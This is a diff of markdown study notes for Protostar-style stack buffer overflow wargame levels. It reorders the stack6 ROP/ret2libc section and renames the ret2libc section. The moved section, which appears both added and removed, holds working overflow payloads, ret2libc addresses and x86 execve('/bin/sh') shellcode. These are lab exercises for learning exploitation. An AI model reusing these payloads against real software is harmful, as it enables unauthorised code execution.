@@ -16,9 +16,10 @@
     - [stack4 solution](#stack4-solution)
   - [stack5: jmp esp](#stack5-jmp-esp)
     - [stack5 solution](#stack5-solution)
-  - [ret2Libc](#ret2libc)
-  - [stack6: return gadget](#stack6-return-gadget)
+  - [stack6: compile time return address check, forbid returning to stack. RoP gadget (Return to .text section)](#stack6-compile-time-return-address-check-forbid-returning-to-stack-rop-gadget-return-to-text-section)
     - [stack6 solution](#stack6-solution)
+  - [stack7: ret2libc](#stack7-ret2libc)
+    - [ret2Libc](#ret2libc)
 
 ## stack0
 
@@ -205,7 +206,56 @@ r <<< $(python3 -c "print('A' * 76 )"|xargs echo -en;echo -en '\xf4\x83\x04\x08'
 
 - A problem: to `jmp esp`, `ebp` must be overwritten (modern system stack cookie)
 
-## ret2Libc
+## stack6: compile time return address check, forbid returning to stack. RoP gadget (Return to .text section)
+
+```sh
+./stack6 <<< $(python3 -c "print('A' * 120 )")
+  # SIGSEGV
+objdump -d stack6
+  # getpath()
+
+b *getpath + 57
+b *getpath + 116
+
+# smashing the stack -> padding=80
+# targetAddr -> p system 0xf7e272e0
+# rtnAddr -> 'AAAA'
+# find 0xf7da0000, 0xffffffff, "/bin/sh" -> 0xf7f1e0af
+# param -> '/bin/sh': 0xf7f1e0af
+
+r <<< $(python3 -c "print('A' * 80 )"|xargs echo -en;echo -en '\xe0\x72\xe2\xf7AAAA\xaf\xe0\xf1\xf7')
+./stack6 <<< $(python3 -c "print('A' * 80 )"|xargs echo -en;echo -en '\xe0\x72\xe2\xf7AAAA\xaf\xe0\xf1\xf7')
+
+# however __libc change location on each load. Try another method.
+```
+
+- `jmp esp` to the .text `ret`, then `jmp esp` again ho bypass the compiler check.
+
+```sh
+r <<< $(python3 -c "print('\x90' * (80-19) + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x87\xe3\xb0\x0b\xcd\x80')"|xargs echo -en;echo -en '\xf9\x84\x04\x08\x10\x69\xa8\xff')
+r <<< $(python3 -c "print('\x90' * (80-19) + '')"|xargs echo -en;echo -en '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x87\xe3\xb0\x0b\xcd\x80';echo -en '\xf9\x84\x04\x08\x10\x69\xa8\xff');
+  # $(python3 -c "import sys;sys.stdout.buffer.write(b'\x90')")
+
+  # For the exam, use the clear-text payload.
+python3 -c "import struct;padding=(b'\x90'*80);ret=struct.pack('I', 0x080484f9);eip = struct.pack('I', 0xbffff7c0);pl=b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x87\xe3\xb0\x0b\xcd\x80';print(padding+ret+eip+pl);"
+  # in 64 bit use struct.pack('Q', address), will parse the address in the right order (LE/BE) depends on the system.
+  # copy the result into $(echo -en 'content')
+r <<< $(echo -en '\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xf9\x84\x04\x08\xc0\xf7\xff\xbf1\xc0Ph//shh/bin\x87\xe3\xb0\x0b\xcd\x80');
+  # If without ASLR, breakpoint at *ret, the stack address stays constant. 
+```
+
+### stack6 solution
+
+```sh
+  # Simulate no ASLR.
+  # set breakpoint at *ret, the 1st address will be the constant `ret` address.
+  # The second time stop at *ret, `set {int} $esp = $esp + 4` `set {int} ($esp+4) = 0xcccccccc`
+  # int3 HIT
+```
+
+## stack7: ret2libc
+
+### ret2Libc
 
 - img:
   ![ret2Libc_visual](./img/ret2Libc_visual.jpg)
@@ -261,50 +311,3 @@ x/s 0x7ffff7f745aa
 ```
 
 - parse the payload
-
-## stack6: return gadget
-
-```sh
-./stack6 <<< $(python3 -c "print('A' * 120 )")
-  # SIGSEGV
-objdump -d stack6
-  # getpath()
-
-b *getpath + 57
-b *getpath + 116
-
-# smashing the stack -> padding=80
-# targetAddr -> p system 0xf7e272e0
-# rtnAddr -> 'AAAA'
-# find 0xf7da0000, 0xffffffff, "/bin/sh" -> 0xf7f1e0af
-# param -> '/bin/sh': 0xf7f1e0af
-
-r <<< $(python3 -c "print('A' * 80 )"|xargs echo -en;echo -en '\xe0\x72\xe2\xf7AAAA\xaf\xe0\xf1\xf7')
-./stack6 <<< $(python3 -c "print('A' * 80 )"|xargs echo -en;echo -en '\xe0\x72\xe2\xf7AAAA\xaf\xe0\xf1\xf7')
-
-# however __libc change location on each load. Try another method.
-```
-
-- `jmp esp` to the .text `ret`, then `jmp esp` again ho bypass the compiler check.
-
-```sh
-r <<< $(python3 -c "print('\x90' * (80-19) + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x87\xe3\xb0\x0b\xcd\x80')"|xargs echo -en;echo -en '\xf9\x84\x04\x08\x10\x69\xa8\xff')
-r <<< $(python3 -c "print('\x90' * (80-19) + '')"|xargs echo -en;echo -en '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x87\xe3\xb0\x0b\xcd\x80';echo -en '\xf9\x84\x04\x08\x10\x69\xa8\xff');
-  # $(python3 -c "import sys;sys.stdout.buffer.write(b'\x90')")
-
-  # For the exam, use the clear-text payload.
-python3 -c "import struct;padding=(b'\x90'*80);ret=struct.pack('I', 0x080484f9);eip = struct.pack('I', 0xbffff7c0);pl=b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x87\xe3\xb0\x0b\xcd\x80';print(padding+ret+eip+pl);"
-  # in 64 bit use struct.pack('Q', address), will parse the address in the right order (LE/BE) depends on the system.
-  # copy the result into $(echo -en 'content')
-r <<< $(echo -en '\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xf9\x84\x04\x08\xc0\xf7\xff\xbf1\xc0Ph//shh/bin\x87\xe3\xb0\x0b\xcd\x80');
-  # If without ASLR, breakpoint at *ret, the stack address stays constant. 
-```
-
-### stack6 solution
-
-```sh
-  # Simulate no ASLR.
-  # set breakpoint at *ret, the 1st address will be the constant `ret` address.
-  # The second time stop at *ret, `set {int} $esp = $esp + 4` `set {int} ($esp+4) = 0xcccccccc`
-  # int3 HIT
-```
